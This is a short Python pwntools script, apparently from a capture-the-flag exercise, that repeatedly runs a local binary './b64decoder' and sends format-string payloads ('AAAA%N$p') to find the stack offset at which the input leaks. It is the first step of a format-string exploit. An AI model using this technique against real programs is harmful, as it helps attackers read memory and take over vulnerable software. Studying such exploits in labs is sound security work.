from pwn import *
for i in xrange(500):
    with context.local(log_level = 'error'):
        try:
            p = process('./b64decoder')
            p.sendline('AAAA%{:d}$p'.format(i+1))
            print i+1,'-',p.recvline_contains('Welcome,').strip()[9+4:]
        except:
            p.close()